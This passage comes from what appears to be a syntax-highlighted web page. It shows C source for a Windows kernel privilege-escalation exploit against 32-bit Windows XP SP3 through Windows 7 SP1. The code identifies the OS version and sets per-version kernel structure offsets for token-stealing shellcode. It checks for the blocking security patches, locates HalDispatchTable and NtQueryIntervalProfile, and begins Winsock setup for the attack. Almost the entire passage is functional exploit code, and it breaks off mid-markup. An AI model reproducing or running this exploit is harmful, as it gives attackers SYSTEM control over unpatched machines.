class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">////////////////////////////////////////////////////////////////</span></span><br><span class="line">    <span class="comment">// IDENTIFY TARGET OS ARCHITECTURE AND VERSION</span></span><br><span class="line">    <span class="comment">////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Identifying OS\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// identify target machine&#x27;s OS architecture</span></span><br><span class="line">    <span class="comment">// in case the target machine is running a 64-bit OS</span></span><br><span class="line">    <span class="keyword">if</span>(IsWow64())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   [-] 64-bit\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;   [+] 32-bit\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// identify target machine&#x27;s OS version</span></span><br><span class="line">    <span class="comment">// https://msdn.microsoft.com/en-us/library/windows/desktop/ms724451(v=vs.85).aspx</span></span><br><span class="line">    <span class="comment">// https://msdn.microsoft.com/en-us/library/windows/desktop/ms724832(v=vs.85).aspx</span></span><br><span class="line">    <span class="comment">// https://msdn.microsoft.com/en-us/library/windows/desktop/ms724833(v=vs.85).aspx</span></span><br><span class="line">    OSVERSIONINFOEX osvi;</span><br><span class="line">    ZeroMemory(&amp;osvi, <span class="keyword">sizeof</span>(OSVERSIONINFOEX));</span><br><span class="line">    osvi.dwOSVersionInfoSize = <span class="keyword">sizeof</span>(OSVERSIONINFOEX);</span><br><span class="line">    GetVersionEx((LPOSVERSIONINFO) &amp;osvi);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// define operating system version specific variables</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> shellcode_KPROCESS;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> shellcode_TOKEN;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> shellcode_UPID;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> shellcode_APLINKS;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> **securityPatchesPtr;</span><br><span class="line">    <span class="type">int</span> securityPatchesCount;</span><br><span class="line">    <span class="type">int</span> lpInBufferSize;</span><br><span class="line"></span><br><span class="line">    <span class="comment">////////////////////////////////////////////////////////////////</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    OS VERSION SPECIFIC OFFSETS</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    references:</span></span><br><span class="line"><span class="comment">      http://www.geoffchappell.com/studies/windows/km/ntoskrnl/structs/kthread/original.htm</span></span><br><span class="line"><span class="comment">      http://www.geoffchappell.com/studies/windows/km/ntoskrnl/structs/kthread/late52.htm</span></span><br><span class="line"><span class="comment">      http://www.geoffchappell.com/studies/windows/km/ntoskrnl/structs/kthread/current.htm</span></span><br><span class="line"><span class="comment">      http://www.geoffchappell.com/studies/windows/km/ntoskrnl/structs/eprocess/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    - nt!_KTHREAD.ApcState.Process (+0x10)</span></span><br><span class="line"><span class="comment">    0x30 (3.51);</span></span><br><span class="line"><span class="comment">    0x34 (&gt;3.51 to 5.1);</span></span><br><span class="line"><span class="comment">    0x28 (late 5.2);</span></span><br><span class="line"><span class="comment">    0x38 (6.0);</span></span><br><span class="line"><span class="comment">    0x40 (6.1);</span></span><br><span class="line"><span class="comment">    0x70 (6.2 and higher)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    - nt!_EPROCESS.Token</span></span><br><span class="line"><span class="comment">    0x0108 (3.51 to 4.0);</span></span><br><span class="line"><span class="comment">    0x012C (5.0);</span></span><br><span class="line"><span class="comment">    0xC8 (5.1 to early 5.2);</span></span><br><span class="line"><span class="comment">    0xD8 (late 5.2);</span></span><br><span class="line"><span class="comment">    0xE0 (6.0);</span></span><br><span class="line"><span class="comment">    0xF8 (6.1);</span></span><br><span class="line"><span class="comment">    0xEC (6.2 to 6.3);</span></span><br><span class="line"><span class="comment">    0xF4</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    - nt!_EPROCESS.UniqueProcessId</span></span><br><span class="line"><span class="comment">    0x94 (3.51 to 4.0);</span></span><br><span class="line"><span class="comment">    0x9C (5.0);</span></span><br><span class="line"><span class="comment">    0x84 (5.1 to early 5.2);</span></span><br><span class="line"><span class="comment">    0x94 (late 5.2);</span></span><br><span class="line"><span class="comment">    0x9C (6.0);</span></span><br><span class="line"><span class="comment">    0xB4</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    - nt!_EPROCESS.ActiveProcessLinks.Flink</span></span><br><span class="line"><span class="comment">    0x98 (3.51 to 4.0);</span></span><br><span class="line"><span class="comment">    0xA0 (5.0);</span></span><br><span class="line"><span class="comment">    0x88 (5.1 to early 5.2);</span></span><br><span class="line"><span class="comment">    0x98 (late 5.2);</span></span><br><span class="line"><span class="comment">    0xA0 (6.0);</span></span><br><span class="line"><span class="comment">    0xB8</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// in case the OS version is 5.1, service pack 3</span></span><br><span class="line">    <span class="keyword">if</span>((osvi.dwMajorVersion == <span class="number">5</span>) &amp;&amp; (osvi.dwMinorVersion == <span class="number">1</span>) &amp;&amp; (osvi.wServicePackMajor == <span class="number">3</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// the target machine&#x27;s OS is Windows XP SP3</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   [+] Windows XP SP3\n&quot;</span>);</span><br><span class="line">        shellcode_KPROCESS = <span class="string">&#x27;\x44&#x27;</span>;</span><br><span class="line">        shellcode_TOKEN    = <span class="string">&#x27;\xC8&#x27;</span>;</span><br><span class="line">        shellcode_UPID     = <span class="string">&#x27;\x84&#x27;</span>;</span><br><span class="line">        shellcode_APLINKS  = <span class="string">&#x27;\x88&#x27;</span>;</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *securityPatches[] = &#123;<span class="string">&quot;KB2503665&quot;</span>, <span class="string">&quot;KB2592799&quot;</span>&#125;;</span><br><span class="line">        securityPatchesPtr = securityPatches;</span><br><span class="line">        securityPatchesCount = <span class="number">2</span>;</span><br><span class="line">        lpInBufferSize = <span class="number">0x30</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// in case the OS version is 5.2, service pack 2, not R2</span></span><br><span class="line">    <span class="comment">//   https://msdn.microsoft.com/en-us/library/windows/desktop/ms724385(v=vs.85).aspx</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>((osvi.dwMajorVersion == <span class="number">5</span>) &amp;&amp; (osvi.dwMinorVersion == <span class="number">2</span>) &amp;&amp; (osvi.wServicePackMajor == <span class="number">2</span>) &amp;&amp; (GetSystemMetrics(<span class="number">89</span>) == <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// the target machine&#x27;s OS is Windows Server 2003 SP2</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   [+] Windows Server 2003 SP2\n&quot;</span>);</span><br><span class="line">        shellcode_KPROCESS = <span class="string">&#x27;\x38&#x27;</span>;</span><br><span class="line">        shellcode_TOKEN    = <span class="string">&#x27;\xD8&#x27;</span>;</span><br><span class="line">        shellcode_UPID     = <span class="string">&#x27;\x94&#x27;</span>;</span><br><span class="line">        shellcode_APLINKS  = <span class="string">&#x27;\x98&#x27;</span>;</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *securityPatches[] = &#123;<span class="string">&quot;KB2503665&quot;</span>, <span class="string">&quot;KB2592799&quot;</span>, <span class="string">&quot;KB2645640&quot;</span>, <span class="string">&quot;KB2975684&quot;</span>&#125;;</span><br><span class="line">        securityPatchesPtr = securityPatches;</span><br><span class="line">        securityPatchesCount = <span class="number">4</span>;</span><br><span class="line">        lpInBufferSize = <span class="number">0x30</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// in case the OS version is 6.0, service pack 1, workstation</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>((osvi.dwMajorVersion == <span class="number">6</span>) &amp;&amp; (osvi.dwMinorVersion == <span class="number">0</span>) &amp;&amp; (osvi.wServicePackMajor == <span class="number">1</span>) &amp;&amp; (osvi.wProductType == <span class="number">1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// the target machine&#x27;s OS is Windows Vista SP1</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   [+] Windows Vista SP1\n&quot;</span>);</span><br><span class="line">        shellcode_KPROCESS = <span class="string">&#x27;\x48&#x27;</span>;</span><br><span class="line">        shellcode_TOKEN    = <span class="string">&#x27;\xE0&#x27;</span>;</span><br><span class="line">        shellcode_UPID     = <span class="string">&#x27;\x9C&#x27;</span>;</span><br><span class="line">        shellcode_APLINKS  = <span class="string">&#x27;\xA0&#x27;</span>;</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *securityPatches[] = &#123;<span class="string">&quot;KB2503665&quot;</span>&#125;;</span><br><span class="line">        securityPatchesPtr = securityPatches;</span><br><span class="line">        securityPatchesCount = <span class="number">1</span>;</span><br><span class="line">        lpInBufferSize = <span class="number">0x30</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// in case the OS version is 6.0, service pack 2, workstation</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>((osvi.dwMajorVersion == <span class="number">6</span>) &amp;&amp; (osvi.dwMinorVersion == <span class="number">0</span>) &amp;&amp; (osvi.wServicePackMajor == <span class="number">2</span>) &amp;&amp; (osvi.wProductType == <span class="number">1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// the target machine&#x27;s OS is Windows Vista SP2</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   [+] Windows Vista SP2\n&quot;</span>);</span><br><span class="line">        shellcode_KPROCESS = <span class="string">&#x27;\x48&#x27;</span>;</span><br><span class="line">        shellcode_TOKEN    = <span class="string">&#x27;\xE0&#x27;</span>;</span><br><span class="line">        shellcode_UPID     = <span class="string">&#x27;\x9C&#x27;</span>;</span><br><span class="line">        shellcode_APLINKS  = <span class="string">&#x27;\xA0&#x27;</span>;</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *securityPatches[] = &#123;<span class="string">&quot;KB2503665&quot;</span>, <span class="string">&quot;KB2975684&quot;</span>&#125;;</span><br><span class="line">        securityPatchesPtr = securityPatches;</span><br><span class="line">        securityPatchesCount = <span class="number">2</span>;</span><br><span class="line">        lpInBufferSize = <span class="number">0x10</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// in case the OS version is 6.0, no service pack*, server</span></span><br><span class="line">    <span class="comment">// *Because Windows Server 2008 is based on the Windows NT 6.0 Service Pack 1 kernel, the RTM release is considered to be Service Pack 1;</span></span><br><span class="line">    <span class="comment">// accordingly, the first service pack is called Service Pack 2.</span></span><br><span class="line">    <span class="comment">//   https://en.wikipedia.org/wiki/Windows_Server_2008</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>((osvi.dwMajorVersion == <span class="number">6</span>) &amp;&amp; (osvi.dwMinorVersion == <span class="number">0</span>) &amp;&amp; (osvi.wServicePackMajor == <span class="number">1</span>) &amp;&amp; (osvi.wProductType != <span class="number">1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// the target machine&#x27;s OS is Windows Server 2008</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   [+] Windows Server 2008\n&quot;</span>);</span><br><span class="line">        shellcode_KPROCESS = <span class="string">&#x27;\x48&#x27;</span>;</span><br><span class="line">        shellcode_TOKEN    = <span class="string">&#x27;\xE0&#x27;</span>;</span><br><span class="line">        shellcode_UPID     = <span class="string">&#x27;\x9C&#x27;</span>;</span><br><span class="line">        shellcode_APLINKS  = <span class="string">&#x27;\xA0&#x27;</span>;</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *securityPatches[] = &#123;<span class="string">&quot;KB2503665&quot;</span>&#125;;</span><br><span class="line">        securityPatchesPtr = securityPatches;</span><br><span class="line">        securityPatchesCount = <span class="number">1</span>;</span><br><span class="line">        lpInBufferSize = <span class="number">0x10</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// in case the OS version is 6.0, service pack 2, server</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>((osvi.dwMajorVersion == <span class="number">6</span>) &amp;&amp; (osvi.dwMinorVersion == <span class="number">0</span>) &amp;&amp; (osvi.wServicePackMajor == <span class="number">2</span>) &amp;&amp; (osvi.wProductType != <span class="number">1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// the target machine&#x27;s OS is Windows Server 2008 SP2</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   [+] Windows Server 2008 SP2\n&quot;</span>);</span><br><span class="line">        shellcode_KPROCESS = <span class="string">&#x27;\x48&#x27;</span>;</span><br><span class="line">        shellcode_TOKEN    = <span class="string">&#x27;\xE0&#x27;</span>;</span><br><span class="line">        shellcode_UPID     = <span class="string">&#x27;\x9C&#x27;</span>;</span><br><span class="line">        shellcode_APLINKS  = <span class="string">&#x27;\xA0&#x27;</span>;</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *securityPatches[] = &#123;<span class="string">&quot;KB2503665&quot;</span>, <span class="string">&quot;KB2975684&quot;</span>&#125;;</span><br><span class="line">        securityPatchesPtr = securityPatches;</span><br><span class="line">        securityPatchesCount = <span class="number">2</span>;</span><br><span class="line">        lpInBufferSize = <span class="number">0x08</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// in case the OS version is 6.1, no service pack (note: Windows Server 2008 R2 is 64-bit only)</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>((osvi.dwMajorVersion == <span class="number">6</span>) &amp;&amp; (osvi.dwMinorVersion == <span class="number">1</span>) &amp;&amp; (osvi.wServicePackMajor == <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// the target machine&#x27;s OS is Windows 7</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   [+] Windows 7\n&quot;</span>);</span><br><span class="line">        shellcode_KPROCESS = <span class="string">&#x27;\x50&#x27;</span>;</span><br><span class="line">        shellcode_TOKEN    = <span class="string">&#x27;\xF8&#x27;</span>;</span><br><span class="line">        shellcode_UPID     = <span class="string">&#x27;\xB4&#x27;</span>;</span><br><span class="line">        shellcode_APLINKS  = <span class="string">&#x27;\xB8&#x27;</span>;</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *securityPatches[] = &#123;<span class="string">&quot;KB2503665&quot;</span>&#125;;</span><br><span class="line">        securityPatchesPtr = securityPatches;</span><br><span class="line">        securityPatchesCount = <span class="number">1</span>;</span><br><span class="line">        lpInBufferSize = <span class="number">0x20</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// in case the OS version is 6.1, service pack 1 (note: Windows Server 2008 R2 is 64-bit only)</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>((osvi.dwMajorVersion == <span class="number">6</span>) &amp;&amp; (osvi.dwMinorVersion == <span class="number">1</span>) &amp;&amp; (osvi.wServicePackMajor == <span class="number">1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// the target machine&#x27;s OS is Windows 7 SP1</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   [+] Windows 7 SP1\n&quot;</span>);</span><br><span class="line">        shellcode_KPROCESS = <span class="string">&#x27;\x50&#x27;</span>;</span><br><span class="line">        shellcode_TOKEN    = <span class="string">&#x27;\xF8&#x27;</span>;</span><br><span class="line">        shellcode_UPID     = <span class="string">&#x27;\xB4&#x27;</span>;</span><br><span class="line">        shellcode_APLINKS  = <span class="string">&#x27;\xB8&#x27;</span>;</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *securityPatches[] = &#123;<span class="string">&quot;KB2503665&quot;</span>, <span class="string">&quot;KB2975684&quot;</span>&#125;;</span><br><span class="line">        securityPatchesPtr = securityPatches;</span><br><span class="line">        securityPatchesCount = <span class="number">2</span>;</span><br><span class="line">        lpInBufferSize = <span class="number">0x10</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// in case the OS version is not any of the previously checked versions</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// the target machine&#x27;s OS is an unsupported 32-bit Windows version</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   [-] Unsupported version\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;      [*] Affected 32-bit operating systems\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;         [*] Windows XP SP3\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;         [*] Windows Server 2003 SP2\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;         [*] Windows Vista SP1\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;         [*] Windows Vista SP2\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;         [*] Windows Server 2008\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;         [*] Windows Server 2008 SP2\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;         [*] Windows 7\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;         [*] Windows 7 SP1\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">////////////////////////////////////////////////////////////////</span></span><br><span class="line">    <span class="comment">// LOCATE REQUIRED OS COMPONENTS</span></span><br><span class="line">    <span class="comment">////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Locating required OS components\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// retrieve system information</span></span><br><span class="line">    <span class="comment">//   https://msdn.microsoft.com/en-us/library/windows/desktop/ms725506(v=vs.85).aspx</span></span><br><span class="line">    <span class="comment">// locate &quot;ZwQuerySystemInformation&quot; in the &quot;ntdll.dll&quot; module</span></span><br><span class="line">    <span class="comment">//   https://msdn.microsoft.com/en-us/library/windows/desktop/ms683212(v=vs.85).aspx</span></span><br><span class="line">    FARPROC ZwQuerySystemInformation;</span><br><span class="line">    ZwQuerySystemInformation = GetProcAddress(GetModuleHandle(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;ZwQuerySystemInformation&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 11 = SystemModuleInformation</span></span><br><span class="line">    <span class="comment">//   http://winformx.florian-rappl.de/html/e6d5d5c1-8d83-199b-004f-8767439c70eb.htm</span></span><br><span class="line">    ULONG systemInformation;</span><br><span class="line">    ZwQuerySystemInformation(<span class="number">11</span>, (PVOID) &amp;systemInformation, <span class="number">0</span>, &amp;systemInformation);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// allocate memory for the list of loaded modules</span></span><br><span class="line">    ULONG *systemInformationBuffer;</span><br><span class="line">    systemInformationBuffer = (ULONG *) <span class="built_in">malloc</span>(systemInformation * <span class="keyword">sizeof</span>(*systemInformationBuffer));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!systemInformationBuffer)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   [-] Could not allocate memory&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// retrieve the list of loaded modules</span></span><br><span class="line">    ZwQuerySystemInformation(<span class="number">11</span>, systemInformationBuffer, systemInformation * <span class="keyword">sizeof</span>(*systemInformationBuffer), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// locate &quot;ntkrnlpa.exe&quot; or &quot;ntoskrnl.exe&quot; in the retrieved list of loaded modules</span></span><br><span class="line">    ULONG i;</span><br><span class="line">    PVOID targetKrnlMdlBaseAddr;</span><br><span class="line">    HMODULE targetKrnlMdlUsrSpcOffs;</span><br><span class="line">    BOOL foundModule = FALSE;</span><br><span class="line">    PSYSTEM_MODULE_INFORMATION loadedMdlStructPtr;</span><br><span class="line">    loadedMdlStructPtr = (PSYSTEM_MODULE_INFORMATION) (systemInformationBuffer + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; *systemInformationBuffer; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(loadedMdlStructPtr[i].ImageName, <span class="string">&quot;ntkrnlpa.exe&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;   [+] ntkrnlpa.exe\n&quot;</span>);</span><br><span class="line">            targetKrnlMdlUsrSpcOffs = LoadLibraryExA(<span class="string">&quot;ntkrnlpa.exe&quot;</span>, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            targetKrnlMdlBaseAddr = loadedMdlStructPtr[i].Base;</span><br><span class="line">            foundModule = TRUE;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strstr</span>(loadedMdlStructPtr[i].ImageName, <span class="string">&quot;ntoskrnl.exe&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;   [+] ntoskrnl.exe\n&quot;</span>);</span><br><span class="line">            targetKrnlMdlUsrSpcOffs = LoadLibraryExA(<span class="string">&quot;ntoskrnl.exe&quot;</span>, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            targetKrnlMdlBaseAddr = loadedMdlStructPtr[i].Base;</span><br><span class="line">            foundModule = TRUE;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// base address of the loaded module (kernel space)</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      [*] Address:      %#010x\n&quot;</span>, targetKrnlMdlBaseAddr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// offset address (relative to the parent process) of the loaded module (user space)</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      [*] Offset:       %#010x\n&quot;</span>, targetKrnlMdlUsrSpcOffs);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!foundModule)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   [-] Could not find ntkrnlpa.exe/ntoskrnl.exe\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// free allocated buffer space</span></span><br><span class="line">    <span class="built_in">free</span>(systemInformationBuffer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// determine the address of the &quot;HalDispatchTable&quot; process (kernel space)</span></span><br><span class="line">    <span class="comment">// locate the offset fo the &quot;HalDispatchTable&quot; process within the target module (user space)</span></span><br><span class="line">    ULONG_PTR HalDispatchTableUsrSpcOffs;</span><br><span class="line">    HalDispatchTableUsrSpcOffs = (ULONG_PTR) GetProcAddress(targetKrnlMdlUsrSpcOffs, <span class="string">&quot;HalDispatchTable&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!HalDispatchTableUsrSpcOffs)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;      [-] Could not find HalDispatchTable\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      [+] HalDispatchTable\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;         [*] Offset:    %#010x\n&quot;</span>, HalDispatchTableUsrSpcOffs);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// calculate the address of &quot;HalDispatchTable&quot; in kernel space</span></span><br><span class="line">    <span class="comment">// 1. identify the base address of the target module in kernel space</span></span><br><span class="line">    <span class="comment">// 2. previous step&#x27;s result [minus] the load address of the same module in user space</span></span><br><span class="line">    <span class="comment">// 3. previous step&#x27;s result [plus] the address of &quot;HalDispatchTable&quot; in user space</span></span><br><span class="line">    <span class="comment">// EQUIVALENT TO:</span></span><br><span class="line">    <span class="comment">// 1. determine RVA of HalDispatchTable</span></span><br><span class="line">    <span class="comment">// *Relative Virtual Address - the address of an item after it is loaded into memory, with the base address of the image file subtracted from it.</span></span><br><span class="line">    <span class="comment">// 2. previous step&#x27;s result [plus] base address of target module in kernel space</span></span><br><span class="line">    ULONG_PTR HalDispatchTableKrnlSpcAddr;</span><br><span class="line">    HalDispatchTableKrnlSpcAddr = HalDispatchTableUsrSpcOffs - (ULONG_PTR) targetKrnlMdlUsrSpcOffs;</span><br><span class="line">    HalDispatchTableKrnlSpcAddr += (ULONG_PTR) targetKrnlMdlBaseAddr;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// locate &quot;NtQueryIntervalProfile&quot; in the &quot;ntdll.dll&quot; module</span></span><br><span class="line">    PNTQUERYINTERVAL NtQueryIntervalProfile;</span><br><span class="line">    NtQueryIntervalProfile = (PNTQUERYINTERVAL) GetProcAddress(GetModuleHandle(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtQueryIntervalProfile&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!NtQueryIntervalProfile)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   [-] Could not find NtQueryIntervalProfile\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;   [+] NtQueryIntervalProfile\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      [*] Address:      %#010x\n&quot;</span>, NtQueryIntervalProfile);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// locate &quot;ZwDeviceIoControlFile&quot; routine in the &quot;ntdll.dll&quot; module</span></span><br><span class="line">    <span class="comment">//   https://msdn.microsoft.com/en-us/library/windows/hardware/ff566441(v=vs.85).aspx</span></span><br><span class="line">    FARPROC ZwDeviceIoControlFile;</span><br><span class="line">    ZwDeviceIoControlFile = GetProcAddress(GetModuleHandle(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;ZwDeviceIoControlFile&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!ZwDeviceIoControlFile)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   [-] Could not find ZwDeviceIoControlFile\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;   [+] ZwDeviceIoControlFile\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      [*] Address:      %#010x\n&quot;</span>, ZwDeviceIoControlFile);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">////////////////////////////////////////////////////////////////</span></span><br><span class="line">    <span class="comment">// SETUP EXPLOITATION PREREQUISITE</span></span><br><span class="line">    <span class="comment">////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Setting up exploitation prerequisite\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// initialize Winsock DLL</span></span><br><span class="line">    <span class="built_in">printf</span> (<span class="string">&quot;   [*] Initialising Winsock DLL\n&quot;</span>);</span><br><span class="line">    WORD wVersionRequested;</span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="type">int</span> wsaStartupErrorCode;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// https://msdn.microsoft.com/en-us/library/windows/desktop/ms632663(v=vs.85).aspx</span></span><br><span class="line">    wVersionRequested = MAKEWORD(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span 